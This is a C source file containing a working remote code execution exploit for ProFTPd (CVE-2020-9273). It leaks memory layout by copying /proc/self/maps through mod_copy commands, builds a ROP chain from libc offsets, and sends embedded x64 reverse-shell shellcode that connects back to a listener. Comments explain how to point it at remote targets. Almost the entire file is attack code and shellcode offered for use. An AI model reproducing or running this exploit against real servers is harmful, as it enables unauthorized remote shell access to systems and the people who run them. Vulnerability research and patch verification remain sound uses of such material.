/*
 * ProFTPd Remote Code Execution exploit - CVE-2020-9273
 *
 * Exploit created by dukpt - please feel free to contact me @DUKPT_
 * 
 * gcc -o exploit_proftpd exploit_proftpd.c && ./exploit_proftpd
 *
 * 
 * Revisions:
 * ---------
 * version 0.1  15/10/2020  first article, constains poc;
 * version 0.2  28/12/2020  demo exploit released, with hardcoded addresses;
 * (long pause)
 * version 1.0  16/08/2021  final exploit, for localhost testing.
 * 
 * 
 * Limitations:
 * ------------
 * - have to manually change FTP_PORT, FTP_HOST, and RSHELL payload if you
 *   want to attack remote targets;
 * - offsets may vary a lot from target/instance execution, so you probably
 *   need to massage a lot memory beforing finding the correct offsets of your
 *   target, which means run the exploit repeatedly until offsets are fixed;
 * - tested on ProFTPd compiled with mod_copy only, if your target have more
 *   modules built-in the offsets will probably change (I didn'test);
 * - libc offsets were calculated on Ubuntu 20.04.2 LTS;
 * - IPv4 addresses only.
 * 
 * 
 * Notes on debugging and compilation:
 * -----------------------------------
 * ProFTPd was compiled with: 
 * 
 * ./configure --prefix=/usr/local --with-modules=mod_copy && make -j8
 * 
 * Add CFLAGS="-g" CXXFLAGS="-g" LDFLAGS="-g" in configure path if you want to
 * debug and start gdb the following way:
 * 
 * I noticed that the vulnerability could also be triggered after timeouts,
 * so I accelerated them adding the following in configure script:
 *  --enable-timeout-idle=60
 *  --enable-timeout-no-transfer=90
 *  --enable-timeout-stalled=120
 * 
 * Although there're not required, I noticed that the same exploitation path
 * could be used to trigger the vulnerability. But seems to be fixed too on
 * the 1.3.7rc3 version.
 * 
 * Credits:
 * --------
 * Antonio Morales - who discovered the vulnerability;
 * @lockedbyte - gave the idea to compile with mod_copy and use SITE CP(FR|TO)
 *               /proc/self/maps file and RETR it from a temp directory, an 
 *               awesome way to have memory layout from the target.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <err.h>
#include <errno.h>


#define FTP_PORT            2121
#define FTP_HOST            "127.0.0.1"


unsigned int get_remote_port(char *pasv_answer);
unsigned long get_mem_addr(const char *what, FILE *fp, int index);

#define exit_on_error(P) \
    if (P)               \
        err(errno, NULL);


#define RCVD_CTRL_BUFF_SIZE 0x200   // store responses of FTP control connection
#define RCVD_DATA_BUFF_SIZE 0x2000  // store responses of FTP data connection
#define SEND_BUFF_SIZE      0x300   // send data on FTP data connection

/* 
 * These are fictitious structures, they do not represents the originals in
 * size, but they help to visualize how data is going to be on memory and 
 * align our shellcode (trying to be didact here)
 */
struct pool_rec {
    unsigned char *first;
    unsigned char *last;
    unsigned char *cleanups;
    unsigned char *sub_pools;
    unsigned char *sub_next;
    unsigned char *sub_prev;
    unsigned char *parent;
    unsigned char *free_first_avail;
    unsigned char *tag;
};

struct cleanup {
    unsigned char *data;
    unsigned char *plain_cleanup_cb;
    unsigned char *child_cleanup_cb;
    unsigned char *next;
};


/*
 * These are some offsets that I managed to find during some tests I did.
 * You may change in the code according to your target.
 */
enum {
    R1 = 0x20f20,
    G1 = 0x303d8,
    S1 = 0x37628
} offset1;
enum {
    R2 = 0x20ea0,
    G2 = 0x30358,
    S2 = 0x37568
} offset2;
enum {
    R3 = 0x20e90,
    G3 = 0x30308,
    S3 = 0x37558
} offset3;


/* 
 * linux/x64 reverse shell shellcode.
 * 
 * This shellcode connects back to 127.1.1.1 address on port 4444.
 * Listener needs to be opened before: nc -vl 127.0.0.1 4444
 * I removed the need of password from originals shellcode.
 * 
 * Author: zerosum0x0
 * https://github.com/zerosum0x0/SLAE64/blob/master/reverseshell/reverseshell.asm
 */
unsigned char rshell[] =
    //"\xcc"                        // int3 (debugging only)
    "\x48\x83\xec\x08"              // sub rsp, 0x8
    "\x31\xf6"                      // xor    %esi,%esi
    "\xf7\xe6"                      // mul    %esi
    "\xff\xc6"                      // inc    %esi
    "\x6a\x02"                      // pushq  $0x2
    "\x5f"                          // pop    %rdi
    "\x04\x29"                      // add    $0x29,%al
    "\x0f\x05"                      // syscall
    "\x50"                          // push   %rax
    "\x5f"                          // pop    %rdi
    "\x52"                          // push   %rdx
    "\x52"                          // push   %rdx
    "\xc7\x44\x24\x04\x7d\xff\xfe"  // movl   $0xfefeff7d,0x4(%rsp)
    "\xfe"
    "\x81\x44\x24\x04\x02\x01\x01"  // addl   $0x2010102,0x4(%rsp)
    "\x02"
    "\x66\xc7\x44\x24\x02\x11\x5c"  // movw   $0x5c11,0x2(%rsp)
    "\xc6\x04\x24\x02"              // movb   $0x2,(%rsp)
    "\x54"                          // push   %rsp
    "\x5e"                          // pop    %rsi
    "\x6a\x10"                      // pushq  $0x10
    "\x5a"                          // pop    %rdx
    "\x6a\x2a"                      // pushq  $0x2a
    "\x58"                          // pop    %rax
    "\x0f\x05"                      // syscall
    //"\x31\xc0"                      // xor    %eax,%eax
    //"\x0f\x05"                      // syscall
	//"\x81\x3c\x24\x5a\x7e\x72\x30"  // cmpl   $0x30727e5a,(%rsp)
	//"\x75\x1f"                      // jne    62 <drop>
    "\x6a\x03"                      // pushq  $0x3
    "\x5e"                          // pop    %rsi
    "\xff\xce"                      // dec    %esi
    "\xb0\x21"                      // mov    $0x21,%al
    "\x0f\x05"                      // syscall
    "\x75\xf8"                      // jne    46 <dupe_loop>
    "\x56"                          // push   %rsi
    "\x5a"                          // pop    %rdx
    "\x56"                          // push   %rsi
    "\x48\xbf\x2f\x2f\x62\x69\x6e"  // movabs $0x68732f6e69622f2f,%rdi
    "\x2f\x73\x68"
    "\x57"                          // push   %rdi
    "\x54"                          // push   %rsp
    "\x5f"                          // pop    %rdi
    "\xb0\x3b"                      // mov    $0x3b,%al
    "\x0f\x05"                      // syscall
    "\x00";

int main(int argc, char *argv[])
{
    int r = 0, socketopt = 1;
    int sock_ctrl = 0, sock_data = 0;
    char buf[RCVD_CTRL_BUFF_SIZE] = {0};
    struct sockaddr_in sa_ctrl = {0}, sa_data = {0};
    struct pool_rec resp_pool = {0};
    struct cleanup cleanup = {0};
    char shellcode[SEND_BUFF_SIZE] = {0};
    char *maps;
    FILE *fmaps;
    unsigned char *RESP_POOL;            // resp_pool
    unsigned char *SESS_CURR_CMD_NOTES;  // session.curr_cmd_rec->notes
    unsigned char *GID_TAB;              // gid_tab
    unsigned char *CLEANUP_POINTER;      // p->sub_pools->cleanups?


    printf("[*] ProFTPd <= 1.3.7rc2 CVE-2020-9273 exploit\n"
           "[*] default payload provides remote shell on 127.0.0.1:4444\n"
           "[*] exploit developed by @dukpt_\n\n");


    /* address structure for FTP command connection */
    sa_ctrl.sin_family = AF_INET;
    sa_ctrl.sin_port = htons(FTP_PORT);
    sa_ctrl.sin_addr.s_addr = inet_addr(FTP_HOST); // should use getaddrinfo()

    /* address structure for FTP data connection */
    sa_data.sin_family = AF_INET;
    sa_data.sin_addr.s_addr = inet_addr(FTP_HOST);

    /* connect to remote FTP and reads banner */
    sock_ctrl = socket(AF_INET, SOCK_STREAM, 0);
    exit_on_error(sock_ctrl < 0);
    r = connect(sock_ctrl, (const struct sockaddr *)&sa_ctrl, sizeof(sa_ctrl));
    exit_on_error(r < 0);
    r = recv(sock_ctrl, buf, RCVD_CTRL_BUFF_SIZE, 0);
    exit_on_error(r < 0);
    buf[RCVD_CTRL_BUFF_SIZE-1] = '\0';

    /* send USER and PASS login commands */
    printf("[+] USER\n");
    r = send(sock_ctrl, "USER poc\r\n", 10, 0);
    r = recv(sock_ctrl, buf, RCVD_CTRL_BUFF_SIZE, 0);
    buf[RCVD_CTRL_BUFF_SIZE-1] = '\0';
    printf("[+] PASS\n");
    r = send(sock_ctrl, "PASS VaiCabelo1\r\n", 17, 0);
    //sleep(1);
    memset(buf, 0, RCVD_CTRL_BUFF_SIZE);
    r = recv(sock_ctrl, buf, RCVD_CTRL_BUFF_SIZE, 0);
    buf[RCVD_CTRL_BUFF_SIZE-1] = '\0';

    if (r < 0 || !strcmp("230 ", buf) || !strcmp("logged in", buf)) {
        err(errno, "wrong user and/or password, can't continue.");
    }

    /* send TYPE I so we can send NULL and other characters in the payload */
    printf("[+] TYPE\n");
    r = send(sock_ctrl, "TYPE I\r\n", 8, 0);
    memset(buf, 0, RCVD_CTRL_BUFF_SIZE);
    r = recv(sock_ctrl, buf, RCVD_CTRL_BUFF_SIZE-1, 0);
    buf[RCVD_CTRL_BUFF_SIZE-1] = '\0';
    exit_on_error(r <= 0);
    if (!strcmp("200 ", buf))
        err(errno, "error TYPE I: %s", buf);

    /* 
     * Thanks to @lockedbyte tip we're able to get a memory layout view using
     * SITE CPFR and SITE CPTO commands. Basically we copy /proc/self/maps to
     * a writable directory and them we RETR it, then we reflect memory heap
     * and libc base addresses into our offsets and payload.
     * The down side is that ProFTPd should have been compiled with mod_copy.
     */ 
    printf("[+] SITE CPFR\n");
    r = send(sock_ctrl, "SITE CPFR /proc/self/maps\r\n", 27, 0);
    sync();       // seems to be required just on local connections
    memset(buf, 0, RCVD_CTRL_BUFF_SIZE);
    r = recv(sock_ctrl, buf, RCVD_CTRL_BUFF_SIZE-1, 0);
    buf[RCVD_CTRL_BUFF_SIZE-1] = '\0';
    if ((r <= 0) || !strcmp("350 ", buf) || !strcmp("exists, ready for", buf))
        err(errno, "error issuing SITE CPFR /proc/self/maps: %s", buf);

    printf("[+] SITE CPTO\n");
    r = send(sock_ctrl, "SITE CPTO /tmp/maps.txt\r\n", 25, 0);
    memset(buf, 0, RCVD_CTRL_BUFF_SIZE);
    r = recv(sock_ctrl, buf, RCVD_CTRL_BUFF_SIZE-1, 0);
    buf[RCVD_CTRL_BUFF_SIZE-1] = '\0';
    if ((r <= 0) || !strcmp("250 ", buf) || !strcmp("successful", buf))
        err(errno, "error issuing SITE CPTO /tmp/maps.txt: %s", buf);

    /*
     * In the 1st version of this exploit I was using the FTP command PORT, so
     * invariably I had to bind(), listen() and accept() for an incoming
     * connection. This means that I had to fork() the process and waitpid()
     * for it's completion. No problem with that, however I found much easier
     * using PASV command, that will activelly connect into FTP remote data 
     * port (I think this what most of the FTP clients preferably do). 
     * So I created another socket and sent data in serialized steps. 
     * 
     * Also with PASV no need to open TCP ports on the router (remote targets)
     */
    printf("[+] PASV\n");
    r = send(sock_ctrl, "PASV\r\n", 6, 0);
    //sync();
    memset(buf, 0, RCVD_CTRL_BUFF_SIZE);
    r = recv(sock_ctrl, buf, RCVD_CTRL_BUFF_SIZE-1, 0);
    buf[RCVD_CTRL_BUFF_SIZE-1] = '\0';
    if (r <= 0 || !strcmp("227 ", buf) || !strcmp("Entering Passive Mode", buf)) {
        err(errno, "%s", buf);
    }
    sa_data.sin_port = htons(get_remote_port(buf));
    sock_data = socket(AF_INET, SOCK_STREAM, 0);
    exit_on_error(sock_data < 0);
    r = setsockopt(sock_data, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &socketopt, sizeof(socketopt));
    exit_on_error(r < 0);
    r = connect(sock_data, (const struct sockaddr *)&sa_data, sizeof(sa_data));
    exit_on_error(r < 0);

    /* 
     * Send RETR to download /tmp/maps.txt file.
     * We store it as mmap.txt in the current directory, we'll use it later.
     */
    printf("[+] RETR\n");
    r = send(sock_ctrl, "RETR /tmp/maps.txt\r\n", 20, 0);
    //sync();
    maps = malloc(RCVD_DATA_BUFF_SIZE);
    memset(maps, 0, RCVD_DATA_BUFF_SIZE);
    memset(buf, 0, RCVD_CTRL_BUFF_SIZE);
    r = recv(sock_ctrl, buf, RCVD_CTRL_BUFF_SIZE-1, 0);
    buf[RCVD_CTRL_BUFF_SIZE-1] = '\0';
    r = recv(sock_data, maps, RCVD_DATA_BUFF_SIZE-1, 0);
    maps[RCVD_DATA_BUFF_SIZE-1] = '\0';
    if (r <= 0 || !strcmp("226 ", buf) || !strcmp("Transfer complete", buf)) {
        err(errno, "%s", buf);
    }
    //sleep(1);
    if (sock_data) {
        close(sock_data);
    }

    fmaps = fopen("mmaps.txt", "w");
    if (!fmaps)
        err(errno, "wtf can't I store a local file at current directory?");

    r = fwrite(maps, sizeof(char), RCVD_DATA_BUFF_SIZE, fmaps);
    if (r < 20)
        err(errno, "file is too small, are you sure you downloaded?");

    fclose(fmaps);

    printf("[+] PASV\n");
    r = send(sock_ctrl, "PASV\r\n", 6, 0);
    memset(buf, 0, RCVD_CTRL_BUFF_SIZE);
    sync();       // seems to be required just on local connections
    sleep(1);     // seems to be required just on local connections
    r = recv(sock_ctrl, buf, RCVD_CTRL_BUFF_SIZE-1, 0);
    buf[RCVD_CTRL_BUFF_SIZE-1] = '\0';
    if (r <= 0 || !strcmp("227 ", buf) || !strcmp("Entering Passive Mode", buf)) {
        err(errno, "%s", buf);
    }
    sa_data.sin_port = htons(get_remote_port(buf));
    sock_data = socket(AF_INET, SOCK_STREAM, 0);
    exit_on_error(sock_data < 0);
    r = setsockopt(sock_data, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &socketopt, sizeof(socketopt));
    exit_on_error(r < 0);
    r = connect(sock_data, (const struct sockaddr *)&sa_data, sizeof(sa_data));
    exit_on_error(r < 0);

    /* 
     * Now we're very close to trigger the vulnerability.
     * At this momment FTP control connection will not reply anymore until we
     * send some data on FTP data connection, so no need to recv() data.
     */
    printf("[+] STOR (2nd)\n");
    r = send(sock_ctrl, "STOR /tmp/aaa.txt\r\n", 19, 0);
    sync(); // seems to be required just on local connections
    memset(buf, 0, RCVD_CTRL_BUFF_SIZE);
    r = recv(sock_ctrl, buf, RCVD_CTRL_BUFF_SIZE, 0);
    buf[RCVD_CTRL_BUFF_SIZE-1] = '\0';
    exit_on_error(r <= 0);
    if (!strcmp("200 ", buf))
        err(errno, "error issuing \"STOR /tmp/aaa.txt\", verify write " \
                   "permissions to this directory\nIf error persist, try "
                   "changing to /dev/shm/ or /run/lock/\n%s", buf);

    /*
     * Now it's time to extract the base addresses of heap and libc from mmaps
     * file and adjust the offsets that we'll use in the exploitation path.
     * We need to calculate the value of resp_pool pointer before issuing the
     * last FTP command.
     */
    unsigned long heap_start = 0L;
    unsigned long heap_end = 0L;
    unsigned long libc_base = 0L;

    fmaps = fopen("mmaps.txt", "r");

    heap_start = get_mem_addr("[heap]", fmaps, 0);
    printf("[+] heap begin: 0x%lx\n", heap_start);
    heap_end = get_mem_addr("[heap]", fmaps, 1);
    printf("[+] heap end:   0x%lx\n", heap_end);

    libc_base = get_mem_addr("/libc-2", fmaps, 0);
    printf("[+] libc begin: 0x%lx\n", libc_base);
    
    if (fmaps)
        fclose(fmaps);

    /*
     * Some offser calculations.
     * Here you try R1,G1,S1 or R2,G2,S2 or R3,G3,S3.
     * Try 4 times each of them.
     */
    RESP_POOL = (unsigned char *)heap_end + R1;             // resp_pool
    GID_TAB = (unsigned char *)heap_start + G1;             // gid_tab
    SESS_CURR_CMD_NOTES = (unsigned char *)heap_start + S1; // session.curr_cmd_rec->notes
    CLEANUP_POINTER = (RESP_POOL+0x48);

    unsigned char *MPROTECT_RDI = (unsigned char *)((unsigned long)RESP_POOL & 0xffffffffff000); // initial memory page address to mprotect
    unsigned char *mblen_112 = (unsigned char *)libc_base + 0x4a550;            // <mblen+112>: pop rax; ret
    unsigned char *strip_217 = (unsigned char *)libc_base + 0x341a9;            // <strip+217>: pop rsi; ret
    unsigned char *do_dlopen_69 = (unsigned char *)libc_base + 0x162865;        // <do_dlopen+69>: pop rax; pop rdx; pop rbx; ret
    unsigned char *funlockfile_73 = (unsigned char *)libc_base + 0x66229;       // <__funlockfile+73>: syscall; ret
    unsigned char *authnone_marshal_17 = (unsigned char *)libc_base + 0x1491a1; // <authnone_marshal+17>: push rdi; pop rsp; jmp [rax+0x18]
    unsigned char *GI___strtod_nan_107 = (unsigned char *)libc_base + 0x54d1b;  // <__GI___strtod_nan+107>: pop rdi; add rsp,0x18; pop rbx; pop rbp; ret
    unsigned char *RETURN_TO_SHELLCODE = RESP_POOL + 0xb8;                      // this is where shellcode will be

    /*
     * We need to send CRAP xxxxxx since the parameter is not upper cased.
     * Also the command should be at most 4 in lenght.
     */
    r = send(sock_ctrl, (void *)"1111 AAAAAAAAAAAAAAAAAAAAAAAAA\r\n", 32, 0);
    sync(); // seems to be required just on local connections
    r = send(sock_ctrl, (void *)"2222 BBBBBBBBBBBBBBBBBBBBBBBBB\r\n", 32, 0);
    sync(); // seems to be required just on local connections
    memset(buf, 0, RCVD_CTRL_BUFF_SIZE);
    memcpy(buf, "3333 CCC", 8);
    memcpy(&buf[8], &CLEANUP_POINTER, 8); // CLEANUP_POINTER = RESP_POOL + 0x48
    r = send(sock_ctrl, (void *)buf, 15, 0);
    // gdb: break pool.c:856 if c == 0x771111111177                             // DEBUG
    //r = send(sock_ctrl, (void *)"3333 CCC\x77\x11\x11\x11\x11\x77\0", 15, 0); // DEBUG
    sync(); // seems to be required just on local connections

    if (sock_ctrl) {
        printf("[+] closing FTP and triggering the vulnerability\n");
        //close(sock_ctrl);
        shutdown(sock_ctrl, SHUT_RDWR);
    } else {
        printf("\n[-] humm strange, why socket is already closed?!\n");
    }


    resp_pool.first = (unsigned char *)0x4141414141414141;             // resp_pool + 0x00
    resp_pool.last = RESP_POOL + 0x10;                                 // p->last = &p->cleanups
    resp_pool.cleanups = (unsigned char *)0x4141414141414141;          // resp_pool + 0x10
    resp_pool.sub_pools = SESS_CURR_CMD_NOTES + 0x18 - 0x28;           // p->sub_pools = ((char *)&session.curr_cmd_rec->notes->chains) - 0x28
    resp_pool.sub_next = GID_TAB + 0x18 - 0xe0;                        // p->sub_next = ((char *)&gid_tab->chains) - 0xe0
    resp_pool.sub_prev = (unsigned char *)0x4141414141414141;          // resp_pool + 0x28
    resp_pool.parent = (unsigned char *)0x4141414141414141;            // resp_pool + 0x30
    resp_pool.free_first_avail = (unsigned char *)0x4141414141414141;  // resp_pool + 0x38
    resp_pool.tag = (unsigned char *)MPROTECT_RDI;                     // resp_pool + 0x40
    cleanup.data = (unsigned char *)RESP_POOL + 0x40;                  // resp_pool + 0x48:  &resp_pool->tag
    cleanup.plain_cleanup_cb = (unsigned char *)authnone_marshal_17;   // resp_pool + 0x50
    cleanup.child_cleanup_cb = (unsigned char *)GI___strtod_nan_107; // resp_pool + 0x58
    cleanup.next = (unsigned char *)0x9999999999999999;                // resp_pool + 0x60:  crap

    /*
     * Now let's build up our final shellcode to be transfered throught the
     * FTP data connection. 
     */
    memcpy(&shellcode[0x00], &resp_pool.first, 8);            // not used, so 0x4141414141414141 (our "token" in memory)
    memcpy(&shellcode[0x08], &resp_pool.last, 8);             // address of &p->cleanups below
    memcpy(&shellcode[0x10], &resp_pool.cleanups, 8);         // must be a high value, so 0x4141414141414141
    memcpy(&shellcode[0x18], &resp_pool.sub_pools, 8);        // (char *)&session.curr_cmd_rec->notes->chains - 0x28
    memcpy(&shellcode[0x20], &resp_pool.sub_next, 8);         // (char *)&gid_tab->chains - 0xe0
    memcpy(&shellcode[0x28], &resp_pool.sub_prev, 8);         // 
    memcpy(&shellcode[0x30], &resp_pool.parent, 8);           // this is our future stack that we'll mprotect
    memcpy(&shellcode[0x38], &resp_pool.free_first_avail, 8); // not used, so 0x4141414141414141
    memcpy(&shellcode[0x40], &resp_pool.tag, 8);              // mprotect 1st parameter, starting of memory page containing our shellcode
    memcpy(&shellcode[0x48], &cleanup.data, 8);               // c->data = &resp_pool->tag (this will be our stack in $rdi)
    memcpy(&shellcode[0x50], &cleanup.plain_cleanup_cb, 8);   // c->plain_cleanup_cb = <authnone_marshal+17>: push rdi; pop rsp; jmp [rax+0x18]
    memcpy(&shellcode[0x58], &cleanup.child_cleanup_cb, 8);   // c->child_cleanup_cb = <__setreuid+64>: pop rdx; add rsp,0x38; ret
    memcpy(&shellcode[0x60], &cleanup.next, 8);               // pop rbx = any crap
    memcpy(&shellcode[0x68], &RETURN_TO_SHELLCODE, 8);        // pop rbp = any crap
    memcpy(&shellcode[0x70], &strip_217, 8);                  // <strip+217>: pop rsi; ret
            shellcode[0x78] = 0;                                      // pop rsi = mprotect 2nd parameter, len 0x2000, so 2 pages
            shellcode[0x79] = 0x20;
    memcpy(&shellcode[0x80], &do_dlopen_69, 8);               // <do_dlopen+69>: pop rax; pop rdx; pop rbx; ret
            shellcode[0x88] = 0x0a;                                   // pop rax = mprotect syscall number
            shellcode[0x90] = 0x7;                                    // pop rdx = mprotect 3rd parameter, 7=rwx
    memcpy(&shellcode[0x98], &RESP_POOL, 8);                  // pop rbx = any crap
    memcpy(&shellcode[0xa0], &funlockfile_73, 8);           // <__funlockfile+73>: syscall; ret
    memcpy(&shellcode[0xa8], &RETURN_TO_SHELLCODE, 8);        // ret (to shellcode =)
    memset(&shellcode[0xb0], 0x90, 8);                        // shellcode start, NOP sled (for debugging)
    memcpy(&shellcode[0xb8], rshell, 96);         // reverse shell

    /*
     * One important thing to remember is that we need to trap SIGALRM on our
     * shell, because when exec'ing /bin/sh the ProFTPd (child) process will 
     * generate a SIGALRM signal that, if not trapped, will kill our shell.
     * So as soon as received the remote callback connection you should issue:
     * 
     * $ trap '' ALRM
     * 
     * This prevents our shell to be killed after reaching "timeout-idle".
     * If sh complains yet, enter "sh" twice to start other instances.
     */

    printf("[+] sending payload: ");
    unsigned int ec = 0;
    unsigned int es = sizeof(ec);
    do {
        printf("+");
        r = send(sock_data, shellcode, SEND_BUFF_SIZE-1, 0);
        //fflush(NULL); // required just in local server and exploit
        //sync();       // same here, can delete if exploiting remote targets
        sleep(1);
        getsockopt(sock_data, SOL_SOCKET, SO_ERROR, &ec, &es);
    } while (ec == 0);

    printf("\n[+] verify your shell %s\n", "\xf0\x9f\x98\x88");

    return 0;
}

/*
 * small routine to calculate port number from network byte order to little
 * endian format (later htons() will convert it back again no network order).
 */
unsigned int get_remote_port(char *pasv_answer) {
    unsigned short int major = 0;
    unsigned short int minor = 0;
    char *p;

    p = rindex(pasv_answer, ')');
    *p = '\0';
    p = rindex(pasv_answer, ',');
    *p = '\0';
    minor = atoi(++p);

    p = rindex(pasv_answer, ',');
    major = atoi(++p);

    return 256*major+minor; // return port number in little endian format
}

/*
 * Auxiliary function to find the base address that we are interested, which
 * are heap and libc base addresses (similar to grep|sed). We get the first
 * address occurrence and stop processing the file. The caller should fopen
 * and fclose FILE *fp.
 * 
 * Explanation about parameters:
 * what: the string we want to find base address;
 * fp: FILE pointer to maps.txt that we just downloaded;
 * index: 0=start address, 1=ending address.
 * 
 * Returns the address already converted to unsigned long.
 */
unsigned long get_mem_addr(const char *what, FILE *fp, int index) {
    char *p;
    char buf[200]; // if you think remote path is longer increase this
    unsigned long addr = 0L;

    (void) fseek(fp, 0L, SEEK_SET);

    while (p = fgets(buf, 200, fp)) {
        if (strstr(buf, what)) {
            p = strtok(buf, "-");
            if (p) {
                if (index == 1) {
                    char *t;
                    p = strtok(NULL, "-");
                    t = strchr(p, ' ');
                    if(t) *t='\0';
                }
                sprintf(buf, "%s", p);
                addr = strtoul(buf, NULL, 16);
                break;
            }
        }
    }

    return addr;
}
